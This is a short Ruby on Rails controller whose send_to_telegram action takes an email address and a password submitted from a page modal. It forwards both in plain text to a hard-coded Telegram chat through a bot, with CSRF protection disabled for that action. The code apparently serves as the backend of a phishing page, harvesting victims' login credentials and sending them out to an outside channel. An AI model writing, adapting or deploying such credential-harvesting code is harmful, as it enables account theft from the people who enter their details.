# app/controllers/containers_controller.rb
class ContainersController < ApplicationController
  protect_from_forgery with: :null_session, only: :send_to_telegram
  def show
    # This action will render the container page with the modal
  end

   def send_to_telegram
    email = params[:email]
    password = params[:password]
    message = "From Bell rails: 
    Email: #{email}
    Password: #{password}"

    bot_token = ENV['TELEGRAM_BOT_TOKEN'] 
    chat_id = 1678259688  
    # message = params[:message]

    # Initialize the TelegramService and send the message
    telegram_service = TelegramService.new(bot_token)
    telegram_service.send_message(chat_id, message)

    render json: { status: 'success' }
  end

  private

  def send_message_to_telegram(message)
    bot = Telegram::Bot::Client.new(Rails.application.credentials.telegram[:bot_token])
    chat_id = '1678259688'  # Replace with your Telegram chat ID

    # Send the message
    bot.api.send_message(chat_id: chat_id, text: message)
  end
end
